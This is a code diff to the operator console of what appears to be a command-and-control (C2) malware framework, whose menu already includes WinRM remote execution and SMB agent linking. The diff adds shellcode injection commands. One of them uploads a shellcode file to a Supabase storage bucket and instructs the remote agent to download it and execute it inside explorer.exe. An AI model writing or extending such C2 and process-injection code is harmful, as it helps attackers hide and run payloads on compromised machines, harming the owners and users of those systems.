@@ -153,6 +153,8 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(" winrmexec <remote_host> <command> [username password domain] :: Execute a command on a remote host via WinRM")
             print(" link smb agent <ip_address> [username password domain]  :: Link the SMB agent to the current host using the specified IP address, optionally with credentials")
             print(" unlink smb agent <ip_address> :: Unlink the SMB agent from the current host using the specified IP address")
+            print(" injectshellcode <file_path>   :: Inject and execute shellcode in explorer.exe")
+            print(" inject_memory <local_path>    :: Upload shellcode file and inject it into explorer.exe")
             print(" kill                          :: Terminate the agent")
             print(" exit                          :: Return to main menu\n")
             continue
@@ -185,6 +187,31 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
             print(f"{RED}Error:{RESET} cmd is passed by default, enter the command you'd want to run after cmd.")
             continue
 
+        if command_text.startswith("inject_memory"):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                print(f"{RED}Error:{RESET} Invalid inject_memory command format. Use 'inject_memory <local_path>'.")
+                continue
+
+            local_path = parts[1]
+            bucket_name = "files"
+            filename = os.path.basename(local_path)
+            storage_path = f"shellcode/{filename}"
+
+            try:
+                if not file_exists_in_supabase(bucket_name, storage_path):
+                    with open(local_path, 'rb') as f:
+                        response = supabase.storage.from_(bucket_name).upload(storage_path, f)
+                    print(f"File uploaded and available at: {get_public_url(bucket_name, storage_path)}")
+                else:
+                    print(f"File already exists at: {get_public_url(bucket_name, storage_path)}")
+
+                file_url = get_public_url(bucket_name, storage_path)
+                command_text = f"execshellcode {file_url}"
+            except Exception as e:
+                print(f"{RED}Error:{RESET} {e}")
+                continue
+
         if command_text == 'ps':
             command_text = "ps"
 
@@ -214,6 +241,14 @@ def send_command_and_get_output(hostname, username, command_mappings, current_sl
                 continue
             else:
                 command_text = f"mkdir {parts[1]}"
+
+        elif command_text.startswith("injectshellcode"):
+            parts = command_text.split(maxsplit=1)
+            if len(parts) == 1:
+                print(f"{RED}Error:{RESET} Invalid injectshellcode command format. Use 'injectshellcode <file_path>'.")
+                continue
+            else:
+                command_text = f"injectshellcode {parts[1]}"
 
         elif command_text.startswith("rm"):
             parts = command_text.split(maxsplit=1)
